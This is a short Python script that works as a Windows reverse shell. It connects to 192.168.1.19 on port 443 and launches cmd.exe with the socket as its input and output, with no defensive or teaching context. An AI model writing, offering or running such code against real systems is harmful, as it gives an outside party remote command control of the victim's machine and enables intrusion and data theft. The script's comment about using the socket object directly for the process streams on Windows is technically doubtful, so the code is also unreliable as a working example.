import socket
import subprocess

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
s.connect(("192.168.1.19", 443))

# Execute a shell
# Note: subprocess.Popen on Windows does not support file descriptor redirection.
# Instead, we use the socket object directly for stdin, stdout, and stderr.
subprocess.Popen(["cmd.exe"], stdin=s, stdout=s, stderr=s, shell=True)
